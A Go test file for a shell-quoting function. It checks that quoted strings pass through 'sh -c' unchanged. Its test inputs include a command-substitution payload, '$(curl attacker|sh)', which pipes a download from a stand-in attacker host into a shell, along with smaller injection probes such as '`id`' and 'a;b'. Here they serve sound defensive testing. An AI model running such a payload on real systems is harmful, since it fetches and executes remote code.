package shellquote

import (
	"os/exec"
	"strings"
	"testing"
)

func TestQuoteKeepsMetacharactersLiteral(t *testing.T) {
	cases := []string{
		"plain",
		"with space",
		"it's",
		"$(curl attacker|sh)",
		"`id`",
		"a;b",
		"new\nline",
		"$HOME",
	}
	for _, c := range cases {
		out, err := exec.Command("sh", "-c", "printf '%s' "+Quote(c)).Output()
		if err != nil {
			t.Fatalf("quote %q: %v", c, err)
		}
		if string(out) != c {
			t.Fatalf("quote %q: shell saw %q", c, out)
		}
	}
}

func TestQuoteWrapsInSingleQuotes(t *testing.T) {
	if got := Quote("a"); !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Fatalf("Quote(%q) = %q, want single-quoted word", "a", got)
	}
}
